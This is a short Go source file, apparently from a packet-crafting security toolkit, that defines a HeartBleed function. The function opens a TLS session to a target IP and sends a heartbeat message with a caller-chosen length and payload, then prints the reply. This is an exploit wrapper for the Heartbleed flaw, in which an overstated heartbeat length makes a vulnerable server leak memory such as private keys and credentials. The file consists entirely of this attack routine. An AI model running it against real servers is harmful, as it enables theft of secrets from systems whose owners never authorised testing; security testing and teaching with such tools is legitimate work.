package higherlevel

import (
	"fmt"
	"github.com/tiagomdiogo/ScaGo/session"
)

func HeartBleed(ip string, length uint16, data string) {
	s, err := session.NewTLSSessionClient(ip)
	if err != nil {
		fmt.Println(err)
		return
	}
	heartBleedResponse, err := s.TlsClient.SendRcvHeartBeat(length, data)
	if err != nil {
		fmt.Println(err)
	}
	fmt.Println("Response: ", heartBleedResponse)
}
